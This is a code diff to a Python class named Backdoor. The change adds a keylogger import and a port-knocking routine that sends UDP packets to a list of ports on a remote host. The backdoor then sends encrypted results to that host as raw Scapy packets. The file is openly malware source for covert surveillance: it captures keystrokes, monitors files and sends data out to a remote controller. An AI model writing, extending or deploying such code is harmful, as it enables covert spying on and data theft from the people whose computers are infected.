@@ -5,14 +5,15 @@ import encryption
 import netifaces
 import helpers
 from fileUtils import FileTransfer, FileMonitor
+from keylog import Keylogger
 
 class Backdoor(object):
 
-    def __init__(self, lhost, lport, lisport, rhost, rport, proto, password, kList):
+    def __init__(self, lhost, lport, fport, rhost, rport, proto, password, kList):
         self.state = 0
         self.localIP = lhost
         self.localPort = int(lport)
-        self.listenPort = int(lisport)
+        self.filePort = int(fport)
         self.remoteIP = rhost
         self.remotePort = int(rport)
         self.protocol = proto.upper()
@@ -116,13 +117,19 @@ class Backdoor(object):
         return self.fileMonitor.removeWatch(path)
 
     def sendResult(self, data):
-        knocker = self.portKnocking(self.knockList)
+        knocker = self.portKnocking()
         time.sleep(3)
 
         payload = encryption.encrypt(self.password + data)
 
         packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
         send(packet, verbose=False)
+
+    def portKnocking(self):
+        for port in self.knockList:
+            pkt = IP(src=self.localIP, dst=self.remoteIP)/UDP(sport=self.localPort, dport=int(port))
+            send(pkt, verbose=False)
+            time.sleep(0.1)
 
     def is_incoming(self, packet):
         """
